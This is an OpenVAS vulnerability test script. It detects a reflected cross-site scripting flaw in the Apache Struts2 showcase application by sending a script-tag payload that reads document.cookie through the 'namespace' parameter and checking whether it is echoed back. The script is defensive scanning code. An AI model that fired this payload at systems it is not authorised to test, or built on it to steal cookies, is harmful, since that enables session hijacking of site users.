###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_showcase_namespace_xss_vuln.nasl 37 2013-11-01 12:53:01Z mime $
#
# Apache Struts2 showcase namespace XSS Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803958";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 37 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-11-01 13:53:01 +0100 (Fr, 01. Nov 2013) $");
  script_tag(name:"creation_date", value:"2013-10-29 15:36:50 +0530 (Tue, 29 Oct 2013)");
  script_name("Apache Struts2 showcase namespace XSS Vulnerability");

  tag_summary =
"This host is installed with Apache Struts2 showcase and is prone to cross-site
scripting Vulnerability.";

tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it is able to
read the string or not.";

tag_insight =
'An error exists in the application which fails to properly sanitize user-supplied
input to "namespace" parameter before using it';

tag_impact =
"Successful exploitation will allow remote attackers to steal the victim's
cookie-based authentication credentials.

Impact Level: Application";

tag_affected =
"Apache Struts2 2.3.15.3";

tag_solution =
"No solution available as of October 29, 2013.";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "summary" , value : tag_summary);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/struts-23153-cross-site-scripting");
  script_xref(name : "URL" , value : "http://www.securityhome.eu/exploits/exploit.php?eid=156451617526e27dd866c97.43571723");
  script_summary("Check if Apache Struts2 is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


## Variable Initialization
asport = "";
asreq = "";
asres = "";

## Get HTTP Port
asport = get_http_port(default:8080);
if(!asport){
  asport = 8080 ;
}

## Check the port status
if(!get_port_state(asport)){
  exit(0);
}

## check the possible paths
foreach dir (make_list("/", "/struts", "/struts2-showcase"))
{
  ## Send and Recieve the response
  asreq = http_get(item:string(dir,"/showcase.action"), port:asport);
  asres = http_keepalive_send_recv(port:asport, data:asreq);

  ## Confirm the application
  if(asres && "The Apache Software Foundation" >< asres && "Showcase<" >< asres &&
     "struts" >< asres)
  {
    ## Construct the attack request
    url = dir + "/config-browser/actionNames.action?namespace=<script>alert(document.cookie);</script>";
    match = "<script>alert\(document.cookie\);</script>";

    if(http_vuln_check(port:asport, url:url, check_header:TRUE,
           pattern:match))
    {
      security_warning(asport);
      exit(0);
    }
  }
}
